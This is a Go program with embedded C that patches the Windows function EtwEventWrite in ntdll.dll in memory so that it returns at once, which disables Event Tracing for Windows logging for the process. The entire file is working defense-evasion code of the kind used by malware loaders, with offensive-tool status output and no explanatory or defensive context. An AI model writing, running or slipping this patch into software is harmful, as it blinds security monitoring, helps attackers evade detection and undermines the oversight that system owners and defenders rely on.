package main

/*
#cgo LDFLAGS: -lkernel32 -lntdll

#include <windows.h>
#include <stdio.h>

BOOL PatchETW(void* function) {
    BYTE hook[] = {0x33, 0xC0, 0xC3};  // XOR EAX,EAX; RET
    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (hModule == NULL) {
        printf("[!] GetModuleHandleA Failed\n");
        return FALSE;
    }
    FARPROC address = GetProcAddress(hModule, function);
    if (address == NULL) {
        printf("[!] GetProcAddress Failed\n");
        return FALSE;
    }
    DWORD oldProtect;
    if (!VirtualProtect(address, sizeof(hook), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtect Failed\n");
        return FALSE;
    }
    memcpy(address, hook, sizeof(hook));
    if (!VirtualProtect(address, sizeof(hook), oldProtect, &oldProtect)) {
        printf("[!] VirtualProtect Restore Failed\n");
        return FALSE;
    }
    printf("[+] Patch ETW Finished!\n");
    return TRUE;
}
*/
import "C"
import (
    "fmt"
    "unsafe"
)

func main() {
    etwevenwrite := "EtwEventWrite"
    cFunctionName := C.CString(etwevenwrite)
    defer C.free(unsafe.Pointer(cFunctionName))

    success := C.PatchETW(unsafe.Pointer(cFunctionName))
    if success == C.FALSE {
        fmt.Println("[!] Patching ETW failed")
    }
}
